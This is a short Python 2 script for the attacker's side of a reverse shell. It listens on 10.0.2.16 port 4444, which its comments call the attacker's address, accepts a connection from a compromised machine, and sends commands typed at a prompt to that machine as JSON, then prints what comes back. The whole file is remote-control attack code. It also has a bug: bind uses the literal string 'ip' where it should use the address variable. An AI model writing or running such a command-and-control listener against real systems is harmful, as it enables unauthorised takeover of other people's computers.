#!/usr/bin/python

import socket
import json

class Listener:
    def __init__(self, ip, port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # Create a TCP socket

        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) # Allow the socket to be reused

        listener.bind(("ip", port)) # Bind the socket to the attacker's IP and port
        listener.listen(0) # Listen for incoming connections
        print("Waiting for incoming connections...") # Print a message to indicate that the listener is waiting for connections
        self.connection, address = listener.accept() # Accept an incoming connection
        print("Connection established! from " + str(address)) # Print a message to indicate that a connection has been established

    def reliable_send(self, data):
        # This function sends data to the connected client
        json_data = json.dumps(data)
        self.connection.send(json_data) # Convert the data to JSON format and send it to the client

    def reliable_receive(self):
        # This function receives data from the connected client
        json_data = ""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024) # Receive data from the client
                return json.loads(json_data) # Convert the JSON data back to Python format
            except ValueError:
                continue
            # If there is a ValueError, continue receiving data until the entire JSON object is received


    def execute_remotely(self, command):
        self.reliable_send(command) # Send the command to the connected client
        return self.reliable_receive()
        # Receive the command result from the client


    def run(self):
        # This function runs the listener and waits for commands from the attacker
        while True:
            command = raw_input(">> ") # Prompt the user for a command
            result = self.execute_remotely(command)
            print(result) # Print the command result


my_listener = Listener("10.0.2.16", 4444) # Create a Listener object with the attacker's IP and port
my_listener.run() # Run the listener



